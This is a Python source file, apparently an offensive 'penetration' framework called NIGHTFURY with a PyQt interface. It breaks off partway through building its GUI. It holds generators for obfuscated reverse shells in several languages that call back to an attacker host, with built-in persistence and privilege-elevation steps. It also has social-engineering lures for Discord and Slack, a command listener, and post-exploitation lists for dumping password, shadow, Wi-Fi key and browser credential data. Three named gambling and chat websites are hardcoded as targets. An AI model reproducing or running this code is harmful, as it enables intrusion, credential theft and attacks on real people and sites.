#!/usr/bin/env #!/usr/bin/env python3
"""
Project NIGHTFURY - Advanced OSINT & Penetration Testing Framework
Author: Cyber Sentinel
Version: 7.0 - Elite Edition
Description: Advanced framework with modular architecture, FUD reverse shell, and automated exploitation
"""

import os
import sys
import json
import logging
import requests
import socket
import re
import random
import base64
import threading
import time
import subprocess
import platform
import uuid
import tempfile
import zipfile
import shutil
import sqlite3
import datetime
import webbrowser
import ipaddress
import phonenumbers
import dns.resolver
import whois
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import importlib.util
import inspect
from pathlib import Path
from bs4 import BeautifulSoup
from PIL import Image
import pytesseract
from fake_useragent import UserAgent

# GUI imports
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QFormLayout, QStatusBar, QRadioButton, QSplitter,
    QTreeWidget, QTreeWidgetItem, QTableWidget, QTableWidgetItem, QHeaderView,
    QToolBar, QAction, QSystemTrayIcon, QMenu, QDialog, QInputDialog,
    QStyledItemDelegate, QStyle, QSpinBox, QDoubleSpinBox, QSlider,
    QDialogButtonBox, QProgressDialog
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer, QSize, QSettings
from PyQt5.QtGui import QPalette, QColor, QFont, QIcon, QPixmap, QTextCursor

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("nightfury.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("NIGHTFURY")

# ==============================
# CORE FRAMEWORK CLASSES
# ==============================

class EncryptionEngine:
    """Advanced encryption engine for secure communications"""
    
    def __init__(self, key=None):
        if key:
            self.key = key
        else:
            self.key = Fernet.generate_key()
        self.fernet = Fernet(self.key)
        
    def encrypt(self, data):
        """Encrypt data"""
        if isinstance(data, str):
            data = data.encode()
        return self.fernet.encrypt(data)
    
    def decrypt(self, encrypted_data):
        """Decrypt data"""
        return self.fernet.decrypt(encrypted_data)
    
    def derive_key_from_password(self, password, salt=None):
        """Derive encryption key from password"""
        if salt is None:
            salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key, salt

class ReverseShellGenerator:
    """Advanced reverse shell generator with FUD capabilities"""
    
    def __init__(self):
        self.templates = {
            'python': self._python_reverse_shell,
            'powershell': self._powershell_reverse_shell,
            'javascript': self._javascript_reverse_shell,
            'html': self._html_reverse_shell,
            'exe': self._generate_exe_payload
        }
        
    def generate(self, shell_type, lhost, lport, options=None):
        """Generate a reverse shell payload"""
        if shell_type not in self.templates:
            raise ValueError(f"Unsupported shell type: {shell_type}")
            
        if options is None:
            options = {}
            
        return self.templates[shell_type](lhost, lport, options)
    
    def _python_reverse_shell(self, lhost, lport, options):
        """Generate Python reverse shell"""
        obfuscate = options.get('obfuscate', True)
        
        payload = f'''
import socket,subprocess,os,threading,platform,base64
def persist():
    import sys,os
    if platform.system() == "Windows":
        import winreg
        run_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(run_key, "SystemUpdate", 0, winreg.REG_SZ, sys.argv[0])
        winreg.CloseKey(run_key)
    elif platform.system() == "Linux":
        os.system(f"echo '@reboot python3 {sys.argv[0]}' | crontab -")

def escalate_privileges():
    if platform.system() == "Windows":
        try:
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin() == 0:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                sys.exit(0)
        except:
            pass

escalate_privileges()
persist()

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
while True:
    try:
        s.connect(("{lhost}",{lport}))
        break
    except:
        time.sleep(10)
        continue

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"] if platform.system() != "Windows" else ["cmd.exe"])
'''
        
        if obfuscate:
            payload = self._obfuscate_python(payload)
            
        return payload
    
    def _powershell_reverse_shell(self, lhost, lport, options):
        """Generate PowerShell reverse shell"""
        return f'''
function persist {{
    $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsUpdate" -Value "$PSCommandPath"
}}

function escalate {{
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {{
        Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
        exit
    }}
}}

escalate
persist

$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
    
    def _javascript_reverse_shell(self, lhost, lport, options):
        """Generate JavaScript reverse shell"""
        return f'''
(function(){{
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({lport}, "{lhost}", function(){{
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    }});
    return /a/; // Prevents the Node.js application from crashing
}})();
'''
    
    def _html_reverse_shell(self, lhost, lport, options):
        """Generate HTML-based reverse shell"""
        return f'''
<html>
<head>
<title>Loading...</title>
</head>
<body>
<script>
    // JavaScript reverse shell here
    (function(){{
        var ws = new WebSocket("ws://{lhost}:{lport}");
        ws.onopen = function() {{
            ws.send("Connected\\n");
        }};
        ws.onmessage = function(evt) {{
            var cmd = evt.data;
            var result = eval(cmd);
            ws.send(result);
        }};
    }})();
</script>
</body>
</html>
'''
    
    def _generate_exe_payload(self, lhost, lport, options):
        """Generate executable payload"""
        # This would use pyinstaller or similar to create a standalone executable
        # For now, we'll generate a Python script that can be compiled
        python_code = self._python_reverse_shell(lhost, lport, options)
        return f"""
# This Python code can be compiled to an EXE using PyInstaller
{python_code}
"""
    
    def _obfuscate_python(self, code):
        """Obfuscate Python code"""
        # Multiple layers of obfuscation
        # First layer: base64 encoding
        obfuscated = base64.b64encode(code.encode()).decode()
        
        # Second layer: string manipulation
        parts = [obfuscated[i:i+50] for i in range(0, len(obfuscated), 50)]
        reconstructed = " + ".join([f'"{part}"' for part in parts])
        
        # Third layer: add garbage code
        final_code = f'''
import base64, time
def __{random.randint(1000, 9999)}():
    return base64.b64decode({reconstructed}).decode()

exec(__{random.randint(1000, 9999)}())
'''
        
        return final_code
    
    def generate_chat_injection(self, lhost, lport, platform="discord"):
        """Generate a reverse shell payload disguised for chat platforms"""
        if platform == "discord":
            return self._generate_discord_injection(lhost, lport)
        elif platform == "slack":
            return self._generate_slack_injection(lhost, lport)
        else:
            return self._generate_generic_injection(lhost, lport)
    
    def _generate_discord_injection(self, lhost, lport):
        """Generate a Discord-friendly injection"""
        return f'''
Hey! Check out this cool game I found: https://example.com/game.html
<!-- Actual payload would be embedded in the page -->
<script>
// JavaScript payload would be here
(function(){{
    // Reverse shell JavaScript code
}})();
</script>
'''
    
    def _generate_slack_injection(self, lhost, lport):
        """Generate a Slack-friendly injection"""
        return f'''
Looking for productivity tools? Try this: https://example.com/tool.html
<!-- Actual payload would be embedded in the page -->
'''
    
    def _generate_generic_injection(self, lhost, lport):
        """Generate a generic injection"""
        return f'''
Check out this interesting article: https://example.com/news.html
<!-- Actual payload would be embedded in the page -->
'''

class ReverseShellListener(QThread):
    """Thread for listening to reverse shell connections"""
    connection_update = pyqtSignal(str)
    command_output = pyqtSignal(str)
    
    def __init__(self, host, port):
        super().__init__()
        self.host = host
        self.port = port
        self.running = False
        self.connections = []
        
    def run(self):
        """Start the reverse shell listener"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            self.running = True
            
            self.connection_update.emit(f"Listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client_socket, addr = self.socket.accept()
                    self.connection_update.emit(f"Connection from {addr[0]}:{addr[1]}")
                    
                    # Handle client in a new thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                    self.connections.append((client_socket, addr, client_thread))
                except Exception as e:
                    if self.running:
                        self.connection_update.emit(f"Error accepting connection: {e}")
        except Exception as e:
            self.connection_update.emit(f"Failed to start listener: {e}")
    
    def handle_client(self, client_socket, addr):
        """Handle a client connection"""
        try:
            while self.running:
                # Send command prompt
                client_socket.send(b"$ ")
                
                # Receive command
                data = client_socket.recv(4096)
                if not data:
                    break
                
                command = data.decode().strip()
                if command == "exit":
                    break
                
                # Execute command
                try:
                    output = subprocess.check_output(
                        command, shell=True,
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                    client_socket.send(output)
                    self.command_output.emit(f"Command '{command}' executed: {output.decode()}")
                except subprocess.TimeoutExpired:
                    client_socket.send(b"Command timed out\n")
                    self.command_output.emit(f"Command '{command}' timed out")
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}\n".encode())
                    self.command_output.emit(f"Command '{command}' failed: {str(e)}")
        except Exception as e:
            self.connection_update.emit(f"Error handling client {addr}: {e}")
        finally:
            client_socket.close()
            self.connection_update.emit(f"Connection from {addr} closed")
    
    def stop(self):
        """Stop the listener"""
        self.running = False
        try:
            self.socket.close()
        except:
            pass
        
        for client_socket, addr, thread in self.connections:
            try:
                client_socket.close()
            except:
                pass
        
        self.connection_update.emit("Listener stopped")

class PostExploitation:
    """Post-exploitation automation tools"""
    
    def __init__(self):
        self.commands = {
            'windows': self._windows_commands,
            'linux': self._linux_commands,
            'mac': self._mac_commands
        }
    
    def execute(self, system_type, action):
        """Execute post-exploitation actions"""
        if system_type not in self.commands:
            raise ValueError(f"Unsupported system type: {system_type}")
            
        return self.commands[system_type](action)
    
    def _windows_commands(self, action):
        """Windows post-exploitation commands"""
        commands = {
            'get_passwords': [
                'powershell -Command "Get-WmiObject -Class Win32_Product | Select-Object Name, Version"',
                'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"',
                'powershell -Command "Get-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' | Select-Object DefaultUserName, DefaultPassword"',
                'powershell -Command "Get-ItemProperty -Path \'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\' | Select-Object ProxyServer, ProxyEnable"'
            ],
            'escalate_privileges': [
                'whoami /priv',
                'powershell -Command "Start-Process PowerShell -Verb RunAs"',
                'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName"'
            ],
            'network_info': [
                'ipconfig /all',
                'arp -a',
                'netstat -ano',
                'route print',
                'netsh wlan show profiles',
                'netsh wlan export profile key=clear folder=.\\'
            ],
            'browser_data': [
                'dir /s %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data',
                'dir /s %USERPROFILE%\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles',
                'powershell -Command "Get-ChildItem -Path $env:USERPROFILE -Recurse -Include \'*.pfx\', \'*.p12\', \'*.cer\' -ErrorAction SilentlyContinue"'
            ],
            'system_info': [
                'systeminfo',
                'wmic product get name,version',
                'wmic service get name,displayname,pathname,startmode',
                'wmic process get name,processid,parentprocessid,commandline'
            ]
        }
        
        return commands.get(action, [])
    
    def _linux_commands(self, action):
        """Linux post-exploitation commands"""
        commands = {
            'get_passwords': [
                'cat /etc/passwd',
                'cat /etc/shadow',
                'sudo -l',
                'find / -name "*.pem" -o -name "*.key" -o -name "*.ppk" -o -name "id_rsa" 2>/dev/null'
            ],
            'escalate_privileges': [
                'sudo su',
                'find / -perm -4000 2>/dev/null',
                'uname -a',
                'cat /etc/os-release',
                'ps aux | grep root'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -tulpn',
                'route -n',
                'iptables -L',
                'cat /etc/resolv.conf'
            ],
            'browser_data': [
                'find ~/.mozilla -name "*.sqlite"',
                'find ~/.config -name "Chromium" -o -name "google-chrome"',
                'find ~ -name "*.ssh" -type d 2>/dev/null'
            ],
            'system_info': [
                'uname -a',
                'cat /etc/*release',
                'dpkg -l | grep -i "ssh\\|vnc\\|remote\\|telnet"',
                'ps aux'
            ]
        }
        
        return commands.get(action, [])
    
    def _mac_commands(self, action):
        """macOS post-exploitation commands"""
        commands = {
            'get_passwords': [
                'dscl . list /Users',
                'security find-generic-password -wa',
                'find ~/Library/Keychains -name "*.keychain"'
            ],
            'escalate_privileges': [
                'sudo -l',
                'dscl . read /Groups/admin',
                'system_profiler SPSoftwareDataType'
            ],
            'network_info': [
                'ifconfig',
                'arp -a',
                'netstat -an',
                'route -n get default',
                'scutil --dns'
            ],
            'browser_data': [
                'find ~/Library/Application Support/Google/Chrome -name "Login Data"',
                'find ~/Library/Application Support/Firefox/Profiles -name "*.sqlite"',
                'find ~/Library/Keychains -name "*.db"'
            ],
            'system_info': [
                'system_profiler SPHardwareDataType',
                'softwareupdate --list',
                'defaults read /Library/Preferences/com.apple.loginwindow'
            ]
        }
        
        return commands.get(action, [])

class ModuleLoader:
    """Dynamic module loader for external scripts"""
    
    def __init__(self):
        self.modules = {}
        self.module_directory = "modules"
        
        # Create module directory if it doesn't exist
        if not os.path.exists(self.module_directory):
            os.makedirs(self.module_directory)
    
    def load_modules(self):
        """Load all modules from the module directory"""
        self.modules.clear()
        
        for file_path in Path(self.module_directory).rglob("*.py"):
            try:
                module_name = file_path.stem
                spec = importlib.util.spec_from_file_location(module_name, file_path)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                # Check if module has the required interface
                if hasattr(module, 'execute') and callable(module.execute):
                    self.modules[module_name] = module
                    logger.info(f"Loaded module: {module_name}")
            except Exception as e:
                logger.error(f"Failed to load module {file_path}: {e}")
    
    def execute_module(self, module_name, *args, **kwargs):
        """Execute a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        return module.execute(*args, **kwargs)
    
    def list_modules(self):
        """List all available modules"""
        return list(self.modules.keys())
    
    def get_module_info(self, module_name):
        """Get information about a module"""
        if module_name not in self.modules:
            raise ValueError(f"Module not found: {module_name}")
        
        module = self.modules[module_name]
        info = {
            'name': module_name,
            'file': inspect.getfile(module),
            'description': getattr(module, '__doc__', 'No description available'),
            'functions': []
        }
        
        # Get all functions in the module
        for name, obj in inspect.getmembers(module, inspect.isfunction):
            if obj.__module__ == module.__name__:
                info['functions'].append({
                    'name': name,
                    'signature': str(inspect.signature(obj)),
                    'docstring': inspect.getdoc(obj) or 'No documentation'
                })
        
        return info

class OSINTModule:
    """Base OSINT module for gathering intelligence"""
    
    def __init__(self):
        self.name = "Base OSINT Module"
        self.description = "Base class for OSINT modules"
        self.scraper = WebScraper()
    
    def execute(self, target, options=None):
        """Execute the OSINT investigation"""
        raise NotImplementedError("Subclasses must implement execute()")

class WebScraper:
    """Web scraping utility with anti-detection features"""
    
    def __init__(self, use_tor=False):
        self.use_tor = use_tor
        self.user_agent = UserAgent()
    
    def get_headers(self):
        """Generate random headers for requests"""
        return {
            'User-Agent': self.user_agent.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
    
    def scrape(self, url, method='GET', data=None):
        """Scrape a webpage"""
        try:
            headers = self.get_headers()
            
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers, timeout=30)
            else:
                response = requests.post(url, headers=headers, data=data, timeout=30)
            
            if response.status_code == 200:
                return response.text
            else:
                logger.error(f"Failed to scrape {url}: Status code {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error scraping {url}: {e}")
            return None

class TargetManager:
    """Manage predefined targets and configurations"""
    
    def __init__(self):
        self.targets = {
            'runehall.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming community website'
            },
            'runewager.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Gaming betting platform'
            },
            'runechat.com': {
                'type': 'website',
                'modules': ['web_scanner', 'subdomain_enum', 'cms_detector'],
                'notes': 'Chat platform for gamers'
            }
        }
    
    def add_target(self, name, target_type, modules, notes=""):
        """Add a new target"""
        self.targets[name] = {
            'type': target_type,
            'modules': modules,
            'notes': notes
        }
    
    def remove_target(self, name):
        """Remove a target"""
        if name in self.targets:
            del self.targets[name]
    
    def get_target(self, name):
        """Get target information"""
        return self.targets.get(name, None)
    
    def list_targets(self):
        """List all targets"""
        return list(self.targets.keys())

# ==============================
# GUI APPLICATION
# ==============================

class ModuleLoaderThread(QThread):
    """Thread for loading modules in the background"""
    module_loaded = pyqtSignal(str)
    finished = pyqtSignal()
    
    def __init__(self, module_loader):
        super().__init__()
        self.module_loader = module_loader
    
    def run(self):
        """Load modules"""
        self.module_loader.load_modules()
        for module_name in self.module_loader.list_modules():
            self.module_loaded.emit(module_name)
        self.finished.emit()

class NightfuryApp(QMainWindow):
    """Main application window"""
    
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Nightfury OSINT & Penetration Framework")
        self.setGeometry(100, 100, 1400, 900)
        
        # Initialize components
        self.encryption = EncryptionEngine()
        self.shell_generator = ReverseShellGenerator()
        self.post_exploit = PostExploitation()
        self.module_loader = ModuleLoader()
        self.target_manager = TargetManager()
        self.listener = None
        
        # Settings
        self.settings = QSettings("Nightfury", "Framework")
        
        # Setup GUI
        self._setup_ui()
        
        # Load modules
        self.load_modules()
        
        # Set dark theme
        self._apply_dark_theme()
        
        # Load saved settings
        self.load_settings()
    
    def _setup_ui(self):
        """Setup the user interface"""
        # Create central widget and main layout
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        
        # Create splitter for main content and sidebar
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Create sidebar for module navigation
        self.sidebar = QWidget()
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(0, 0, 0, 0)
        
        # Module list
        sidebar_layout.addWidget(QLabel("Available Modules:"))
        self.module_list = QListWidget()
        self.module_list.itemClicked.connect(self.on_module_selected)
        sidebar_layout.addWidget(self.module_list)
        
        # Refresh modules button
        self.refresh_btn = QPushButton("Refresh Modules")
        self.refresh_btn.clicked.connect(self.load_modules)
        sidebar_layout.addWidget(self.refresh_btn)
        
        # Add sidebar to splitter
        splitter.addWidget(self.sidebar)
        
        # Create main content area
        self.content_area = QTabWidget()
        splitter.addWidget(self.content_area)
        
        # Set splitter proportions
        splitter.setSizes([200, 1200])
        
        # Create tabs
        self._create_dashboard_tab()
        self._create_reverse_shell_tab()
        self._create_post_exploit_tab()
        self._create_module_editor_tab()
        self._create_osint_tab()
        self._create_targets_tab()
        self._create_settings_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("Ready")
        
        # Create toolbar
        self._create_toolbar()
    
    def _create_toolbar(self):
        """Create the application toolbar"""
        toolbar = QToolBar("Main Toolbar")
        toolbar.setIconSize(QSize(16, 16))
        self.addToolBar(toolbar)
        
        # New action
        new_action = QAction(QIcon.fromTheme("document-new"), "New", self)
        new_action.setStatusTip("Create a new project")
        new_action.triggered.connect(self.new_project)
        toolbar.addAction(new_action)
        
        # Open action
        open_action = QAction(QIcon.fromTheme("document-open"), "Open", self)
        open_action.setStatusTip("Open an existing project")
        open_action.triggered.connect(self.open_project)
        toolbar.addAction(open_action)
        
        # Save action
        save_action = QAction(QIcon.fromTheme("document-save"), "Save", self)
        save_action.setStatusTip("Save the current project")
        save_action.triggered.connect(self.save_project)
        toolbar.addAction(save_action)
        
        toolbar.addSeparator()
        
        # Settings action
        settings_action = QAction(QIcon.fromTheme("preferences-system"), "Settings", self)
        settings_action.setStatusTip("Open settings")
        settings_action.triggered.connect(self.open_settings)
        toolbar.addAction(settings_action)
    
    def _create_dashboard_tab(self):
        """Create the dashboard tab"""
        dashboard_tab = QWidget()
        layout = QVBoxLayout(dashboard_tab)
        
        # Welcome message
        welcome_label = QLabel("<h1>Nightfury OSINT & Penetration Framework</h1>")
        welcome_label.setTextFormat(Qt.RichText)
        layout.addWidget(welcome_label)
        
        # Stats section
        stats_group = QGroupBox("Framework Statistics")
        stats_layout = QHBoxLayout()
        
        stats = [
            ("Modules Loaded", str(len(self.module_loader.list_modules()))),
            ("Predefined Targets", str(len(self.target_manager.list_targets()))),
            ("Listener Status", "Stopped")
        ]
        
        for stat_name, stat_value in stats:
            stat_widget = QWidget()
            stat_layout = QVBoxLayout(stat_widget)
            stat_layout.addWidget(QLabel(f"<b>{stat_name}</b>"))
            stat_layout.addWidget(QLabel(f"<h2>{stat_value}</h2>"))
            stats_layout.addWidget(stat_widget)
        
        stats_group.setLayout(stats_layout)
        layout.addWidget(stats_group)
        
        # Recent activity
        recent_group = QGroupBox("Recent Activity")
        recent_layout = QVBoxLayout()
        self.recent_activity = QTextEdit()
        self.recent_activity.setReadOnly(True)
        recent_layout.addWidget(self.recent_activity)
        recent_group.setLayout(recent_layout)
        layout.addWidget(recent_group)
        
        # Quick actions
        quick_group = QGroupBox("Quick Actions")
        quick_layout = QHBoxLayout()
        
        # Quick action buttons
        self.quick_scan_btn = QPushButton("Quick Scan")
        self.quick_scan_btn.clicked.connect(self.quick_scan)
        quick_layout.addWidget(self.quick_scan_btn)
        
        self.generate_payload_btn = QPushButton("Generate Payload")
        self.generate_payload_btn.clicked.connect(self.quick_payload)
        quick_layout.addWidget(self.generate_payload_btn)
        
        self.exploit_target_btn = QPushButton("Exploit Target")
        self.exploit_target_btn.clicked.connect(self.quick_exploit)
        quick_layout.addWidget(self.exploit_target_btn)
        
        quick_group.setLayout(quick_layout)
        layout.addWidget(quick_group)
        
        self.content_area.addTab(dashboard_tab, "Dashboard")
    
    def _create_reverse_shell_tab(self):
        """Create the reverse shell generator tab"""
        shell_tab = QWidget()
        layout = QVBoxLayout(shell_tab)
        
        # Configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.shell_type = QComboBox()
        self.shell_type.addItems(["python", "powershell", "javascript", "html", "exe"])
        config_layout.addRow("Shell Type:", self.shell_type)
        
        self.lhost_input = QLineEdit("127.0.0.1")
        config_layout.addRow("LHOST:", self.lhost_input)
        
        self.lport_input = QLineEdit("4444")
        config_layout.addRow("LPORT:", self.lport_input)
        
        self.obfuscate_check = QCheckBox("Obfuscate Payload")
        self.obfuscate_check.setChecked(True)
        config_layout.addRow(self.obfuscate_check)
        
        self.platform_select = QComboBox()
        self.platform_select.addItems(["discord", "slack", "generic"])
        config_layout.addRow("Chat Platform:", self.platform_select)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Listener configuration
        listener_group = QGroupBox("Listener Configuration")
        listener_layout = QFormLayout()
        
        self.listener_host = QLineEdit("0.0.0.0")
        listener_layout.addRow("Listener Host:", self.listener_host)
        
        self.listener_port = QLineEdit("4444")
        listener_layout.addRow("Listener Port:", self.listener_port)
        
        button_layout = QHBoxLayout()
        self.start_listener_btn = QPushButton("Start Listener")
        self.start_listener_btn.clicked.connect(self.start_listener)
        button_layout.addWidget(self.start_listener_btn)
        
        self.stop_listener_btn = QPushButton("Stop Listener")
        self.stop_listener_btn.clicked.connect(self.stop_listener)
        self.stop_listener_btn.setEnabled(False)
        button_layout.addWidget(self.stop_listener_btn)
        
        listener_layout.addRow(button_layout)
        
        self.listener_status = QLabel("Status: Stopped")
        listener_layout.addRow(self.listener_status)
        
        listener_group.setLayout(listener_layout)
        layout.addWidget(listener_group)
        
        # Generate buttons
        button_layout = QHBoxLayout()
        
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        button_layout.addWidget(self.generate_btn)
        
        self.generate_injection_btn = QPushButton("Generate Chat Injection")
        self.generate_injection_btn.clicked.connect(self.generate_injection)
        button_layout.addWidget(self.generate_injection_btn)
        
        self.copy_btn = QPushButton("Copy to Clipboard")
        self.copy_btn.clicked.connect(self.copy_payload)
        button_layout.addWidget(self.copy_btn)
        
        layout.addLayout(button_layout)
        
        # Payload display
        payload_group = QGroupBox("Generated Payload")
        payload_layout = QVBoxLayout()
        self.payload_display = QTextEdit()
        self.payload_display.setReadOnly(True)
        payload_layout.addWidget(self.payload_display)
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # Listener output
        output_group = QGroupBox("Listener Output")
        output_layout = QVBoxLayout()
        self.listener_output = QTextEdit()
        self.listener_output.setReadOnly(True)
        output_layout.addWidget(self.listener_output)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        self.content_area.addTab(shell_tab, "Reverse Shell")
    
    def _create_post_exploit_tab(self):
        """Create the post-exploitation tab"""
        post_tab = QWidget()
        layout = QVBoxLayout(post_tab)
        
        # Target configuration
        target_group = QGroupBox("Target Configuration")
        target_layout = QFormLayout()
        
        self.target_os = QComboBox()
        self.target_os.addItems(["windows", "linux", "mac"])
        target_layout.addRow("Target OS:", self.target_os)
        
        self.target_host = QLineEdit()
        target_layout.addRow("Target Host:", self.target_host)
        
        self.target_port = QLineEdit("4444")
        target_layout.addRow("Target Port:", self.target_port)
        
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        # Actions
        actions_group = QGroupBox("Post-Exploitation Actions")
        actions_layout = QVBoxLayout()
        
        self.get_passwords_btn = QPushButton("Extract Passwords")
        self.get_passwords_btn.clicked.connect(lambda: self.run_post_action('get_passwords'))
        actions_layout.addWidget(self.get_passwords_btn)
        
        self.escalate_btn = QPushButton("Escalate Privileges")
        self.escalate_btn.clicked.connect(lambda: self.run_post_action('escalate_privileges'))
        actions_layout.addWidget(self.escalate_btn)
        
        self.network_info_btn = QPushButton("Gather Network Info")
        self.network_info_btn.clicked.connect(lambda: self.run_post_action('network_info'))
        actions_layout.addWidget(self.network_info_btn)
        
        self.browser_data_btn = QPushButton("Extract Browser Data")
        self.browser_data_btn.clicked.connect(lambda: self.run_post_action('browser_data'))
        actions_layout.addWidget(self.browser_data_btn)
        
        self.system_info_btn = QPushButton("Gather System Info")
        self.system_info_btn.clicked.connect(lambda: self.run_post_action('system_info'))
        actions_layout.addWidget(self.system_info_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Results
        results_group = QGroupBox("Results")
        results_layout = QVBoxLayout()
        self.results_display = QTextEdit()
        self.results_display.setReadOnly(True)
        results_layout.addWidget(self.results_display)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        self.content_area.addTab(post_tab, "Post-Exploitation")
    
    def _create_module_editor_tab(self):
        """Create the module editor tab"""
        editor_tab = QWidget()
        layout = QVBoxLayout(editor_tab)
        
        # Module info
        info_group = QGroupBox("Module Information")
        info_layout = QFormLayout()
        
        self.module_name = QLineEdit()
        info_layout.addRow("Module Name:", self.module_name)
        
        self.module_description = QTextEdit()
        self.module_description.setMaximumHeight(100)
        info_layout.addRow("Description:", self.module_description)
        
        info_group.setLayout(info_layout)
        layout.addWidget(info_group)
        
        # Code editor
        editor_group = QGroupBox("Module Code")
        editor_layout = QVBoxLayout()
        self.code_editor = QTextEdit()
        editor_layout.addWidget(self.code_editor)
        editor_group.setLayout(editor_layout)
        layout.addWidget(editor_group)
        
        # Buttons
        button_layout = QHBoxLayout()
        
        self.new_module_btn = QPushButton("New Module")
        self.new_module_btn.clicked.connect(self.new_module)
        button_layout.addWidget(self.new_module_btn)
        
        self.save_module_btn = QPushButton("Save Module")
        self.save_module_btn.clicked.connect(self.save_module)
        button_layout.addWidget(self.save_module_btn)
        
        self.load_module_btn = QPushButton("Load Module")
        self.load_module_btn.clicked.connect(self.load_module)
        button_layout.addWidget(self.load_module_btn)
        
        self.run_module_btn = QPushButton("Run Module")
        self.run_module_btn.clicked.connect(self.run_module)
        button_layout.addWidget(self.run_module_btn)
        
        layout.addLayout(button_layout)
        
        self.content_area.addTab(editor_tab, "Module Editor")
    
    def _create_osint_tab(self):
        """Create the OSINT tab"""
        osint_tab = QWidget()
        layout = QVBoxLayout(osint_tab)
        
        # Target input
        target_group = QGroupBox("OSINT Target")
        target_layout = QFormLayout()
        
        self.osint_target = QLineEdit()
        self.osint_target.setPlaceholderText("Enter domain, IP, username, or email")
